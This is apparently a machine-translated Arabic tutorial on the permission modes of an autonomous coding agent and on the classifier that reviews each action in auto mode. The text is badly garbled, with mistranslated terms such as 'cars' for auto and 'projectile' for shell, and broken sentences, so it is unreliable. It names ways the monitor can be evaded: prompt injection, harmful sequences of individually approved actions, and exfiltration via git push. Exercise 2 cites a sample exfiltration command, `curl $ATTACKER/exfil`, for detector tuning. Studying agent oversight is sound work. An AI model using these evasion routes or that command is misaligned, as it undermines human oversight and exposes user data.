# طرق الإذن للوكلاء المستقلين

> سلم الإذن  مستويات متدنية من الاستقلال من مراجعة كل عمل إلى الموافقة على كل شيء  هو كيفية حكم الحزام ما يمكن للعميل المستقل القيام به دون أن يطلب. Claude الكود، مثال العمل في هذا الدروس، يضع ستة من هذه الطرق: "خطط" يسأل قبل كل عمل، "الوضع الافتراضي" (تسمية "اليدوية" في UI) يطلب فقط من المخاطر، "acceptEdits"تؤكد التمرير المفرد بشكل تلقائي ولكن لا يزال يؤكد تنفيذ القذيفة، و"bypassPermissions" يوافق على كل شيء `auto` يُستبدل وضع الإذن  الموافقة على كل إجراء بنموذج تصنيف منفصل يراجع كل إجراء قبل أن يتم تشغيله ويحجب أي شيء يتجاوز ما طلبه الطلب. يتم تطبيق ميزانيات العمل عبر `max_turns` و `max_budget_usd`. توافر `auto` يعتمد على الخطة، وتمكين المنظمة، النموذج، ومقدم الخدمة Anthropic هو صريح أن المصنف لا يكفي وحده.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## المشكلة

وكيل التشفير المستقل على جهازك هو فئة أمن متميزة. سطح الهجوم هو كل شيء يمكن للوكيل الوصول إليه  نظام الملفات، الشبكة، والإثباتات، واللوحة المقطوعة، أي علامة التبويب المتصفح، أي محطة مفتوحة. بروس شنيير وغيرهم قد أشاروا إلى هذا علنا: وكلاء استخدام الكمبيوتر ليست "تحديث ميزة" من الروبوتات، فهي نوع جديد من الأدوات مع نوع جديد من ملف الخطر.

Claude نظام الإذن في الشفرة هو Anthropicبدلا من واحد "متحرك مستقل / غير مستقل"، هناك ستة أنظمة تتجاوز سلم القدرات: خطة → افتراضية → acceptEdits → … → bypassPermissions. كل وضع هو توازن مختلف بين السرعة والإعادة النظر في كل عمل. وضع السيارات (مارس 2026) يضيف نموذج تصنيف منفصل يزيل الموافقة عن مسار المستخدم الحرج: فإنه يراجع كل عمل قبل تشغيله ويحجب أي شيء يتصاعد خارج الطلب.

السؤال الهندسي: ما الذي يلتقطه هذا النظام، ما الذي يفوته، وما هو النمط الذي تؤدي به مهمة معينة في الواقع؟

## المفهوم

### الوضع الستة

| الوضع | السلوك | متى تستخدم |
|---|---|---|
| `plan` | يقدم الوكيل خطة، ويقبل المستخدم خطة كاملة، ويتم مراجعة كل عمل قبل تنفيذها | مهمة غير مألوفة، رمز المجاور، أول مرة تستخدم فيها الوكيل في إعادة التأمين |
| `default` | "اليدوية" في UI. يقوم العميل بإجراءات؛ يطلب من المستخدم أي إجراءات "خطرية" (إجراءات القذيفة، عمليات مدمرة، مكالمات الشبكة) | معظم جلسات التشفير التفاعلية |
| `acceptEdits` | الملف يكتب التوافق التلقائي؛ إدارة القبو والاتصالات الشبكة لا تزال على الفور | إعادة تعديل الملفات عبر العديد من الملفات |
| `auto` | نموذج تصنيف منفصل يراجع كل عمل قبل أن يبدأ؛ يمنع أي شيء يتصاعد خارج الطلب | تشغيلات طويلة الأفق بدون مراقبة في مساحة عمل محدودة |
| `dontAsk` | لا تُطلب أبداً؛ يتم رفض الإجراءات التي لم يتم الموافقة عليها مسبقاً من قواعد الإذن | صناديق الرمل الزائدة CI الوظائف، النصوص البحثية |
| `bypassPermissions` | يوافق على كل شيء | وثيقة "فقط داخل الحاويات الفارغة كنت على استعداد لترمي" |

(الأسماء أعلاه متطابقة العامة Claude وثائق الرمز؛ UI اللقب `default` "اليدوية".)

### الوضع التلقائي في صفحة واحدة

وضع السيارات (الذي تم إطلاقه في 24 مارس 2026) هو أول وضع تصريح للتفويض على موافقة كل عمل على نموذج. الهيكل:

1. **نموذج تصنيف منفصل** يقوم بمراجعة كل إجراء مقترح قبل أن يتم تشغيله، ويحكم عليه على المهمة المعلنة وحالة الجلسة الحالية، ويحجب أي شيء يتجاوز ما يطلبه الطلب.
2. **إمكانية التوافر** ما إذا كان `auto` ويعتمد على الخطة و إمكانيات التنظيم و النموذج و المزود

تُقيم ضوابط الميزانية جنباً إلى جنب مع المصنف:

- `max_turns` إجمالي التكرارات في جلسة.
- `max_budget_usd` -الحد الأقصى للدولار الذي يمنع الجلسة
- حدود عدد الإجراءات لكل أداة (لا تزيد عن N) `WebFetch` مكالمات الخ)

### ما يلتقطه النظام

- الحقن المباشر في مدخلات الأداة حيث يتم رسم التعليمات المحققة إلى شكل عمل معروف مخاطر.
- حلقات الأداة المتكررة  يمكن للمصنف أن يرى أن الإجراء N+1 هو متطابق تقريبًا مع الإجراء N ، خمس مرات على التوالي.
- واضحة خارج نطاق القاعدة القذيفة في جلسة غيرها من إصدار الملفات فقط.

### ما يمكن أن يفوت النظام

- **حقن سريع** التي تقوم بتحكم السلوك دون أن تنتج إجراءً واحدًا معينًا.OpenAI رأس الاستعداد، 2025, على وكلاء المتصفحين  انظر الدروس 11).
- **سلوك غير جيد على مستوى التعريف** كل عمل فردي يمكن أن يبدو آمناً بينما المسار المكوّن ضار. يحكم المصنف على العمل؛ فإنه لا يعيد استنتاج نية المستخدم.
- **التخفيض عبر قنوات مشروعة** كتابة البيانات إلى ملف تملكه، ثم `git push`إعادة التأمين العام، هو سلسلة من الإجراءات المسموح بها التي هي المشكلة.

### إطار لمشاهدة البحث

Anthropic أرسلت في وضع التلقائي كتحليل مقدم الوثائق واضحة أن المصنف هو طبقة، وليس حل: من المتوقع أن يجمع المستخدمون وضع السيارات مع الميزانيات، والمساعدات، ومناطق العمل المعزولة، ومراجعات المسار (الدرس 1216). يعكس إطار المشاهدة المسبقة أيضًا الفجوة الموثقة بين التقييم مقابل التنفيذ (الدرس 1)  يمكن للمصنف الذي يمر بتقييمات خارج الاتصال أن يتصرف بشكل مختلف في جلسة حقيقية حيث يكون سياق المستخدم غامضًا.

### حيث يعيش هذا السلم في سير عملك

- مهمة غير مألوفة: البدء `plan`قراءة الخطة أرخص من التراجع عن السوء
- المعدل المعروف: `acceptEdits` يُحفظ الكثير من النقرات التأكيدية.
- تشغيل خلفية غير مراقبة: `auto` فقط داخل مساحة عمل قد قيّمت قطرها (لا توثيقات، لا تركيبات إنتاج، لا خروج لم تختار).
- الحاويات الفارغة: `dontAsk` / `bypassPermissions` المقبول إذا كانت الحاوية وذات الأوثاق القابلة للتصرف

```figure
autonomy-oversight
```

## استخدمها

`code/main.py` يحاكي تصنيف مراجعة العمل كخط أنابيب مرحلتين  تبسيط التدريس `auto` يتم دعم النظام بواسطة نموذج تصنيف منفصل ، وليس عقد مكتوب من مرحلتين. مرحلة 1 هي قاعدة كلمة رئيسية رخيصة على الإجراءات المقترحة. مرحلة 2 هي مراجعة متعددة القواعد البطيئة. يقوم السائق بتغذية مسار اصطناعي قصير (إجراءات آمنة ، محاولة حقن سريعة ، حلقة متكررة) ويعرض أين يلتقط المصنف وأين يخطأ.

## أرسله

`outputs/skill-permission-mode-picker.md` يطابق وصف المهمة مع وضع الإذن الصحيح، والحد الأقصى للميزانية، والعزل المطلوب.

## التمارين

1. أركض `code/main.py`أي نوع من النوعات الاصطناعية لا يتم إشارة به أبداً من قبل المرحلة الأولى ولكن دائماً يتم القبض عليه من قبل المرحلة الثانية؟

2. تمديد قاعدة المرحلة 1 التي تعيينها لالتقاط شكل معين معروف سيء (على سبيل المثال، `curl $ATTACKER/exfil`) قياس معدل الإيجابية الخاطئة على عينة العمل الخير.

3. اقرأ Anthropic" كيف يعمل حلقة الوكيل " الوثيقة. قائمة كل حالة خارجية الوكيل يلمس من قبل الافتراضي في `default` أي من هذه المواقع تحتاج إلى البوابة بشكل منفصل قبل تشغيل `auto` بدون مراقبة؟

4. تصميم ميزانية 24 ساعة بدون مراقبة: `max_turns`, `max_budget_usd`، كوبات لكل أداة، وسموحات، وبرر كل رقم

5. وصف مسار واحد حيث يتم موافقة كل عمل فردي من قبل المصنف، ومع ذلك السلوك المكوّن غير متسلسل. (تغطي الدروس 14 كيفية حل هذه المسألة من خلال مفاتيح القتل والرموز القناري).

## الشروط الرئيسية

| المدة | ما يقوله الناس | ما يعنيه هذا في الواقع |
|---|---|---|
| وضع الإذن | "كم يستطيع العميل فعله" | واحدة من ستة سياسات مسموحة بالتحكم في الموافقة على كل عمل |
| وضع الخطة | "اسأل قبل أي شيء" | الوكيل يكتب خطة، المستخدم يوافق قبل تنفيذها |
| acceptEdits | "دعها تكتب الملفات" | الملف يكتب التوافق التلقائي؛ إكسبيل القبو لا يزال يطلب |
| السيارات | "موافقة السيارات" | نموذج تصنيف منفصل يراجع كل إجراء؛ يمنع التصعيد خارج الطلب |
| bypassPermissions | "مكتمل" YOLO" | يوافق على كل شيء ، مصممة للمحاوضات الفارغة |
| المرحلة 1 (المقارنة) | "تحقق سريع من الكلمات الرئيسية" | الحكم الرخيص على الإجراءات المقترحة في `code/main.py` |
| المرحلة الثانية (المقارنة) | "مراجعة عميقة" | المراجعة المتعددة القواعد البطيئة للعمل المشارك في `code/main.py` |
| عرض مقدم للبحث | "لا" GA" | Anthropic الإطار لميزات لا تزال وضع الفشل يتم رسمها |

## المزيد من القراءة

- [Anthropic كيف يعمل حلقة الوكيل](https://code.claude.com/docs/en/agent-sdk/agent-loop) أنماط الإذن، الميزانيات، شكل العمل.
- [Anthropic — Claude المعلومات المختلفة](https://platform.claude.com/docs/en/managed-agents/overview) نموذج تنفيذ الخدمات المدارة.
- [Anthropic — Claude صفحة المنتج](https://www.anthropic.com/product/claude-code) إعلان سطح الميزات والوضع السريع.
- [Anthropic — Claudeالدستور (كانون الثاني / يناير 2026)](https://www.anthropic.com/news/claudes-constitution) الطبقة القائمة على العقل التي تشكل أحكام المصنف.
- [Anthropic قياس استقلالية الوكالة في الممارسة العملية](https://www.anthropic.com/research/measuring-agent-autonomy) منظور داخلي لتصميم الإذن طويل الأفق.
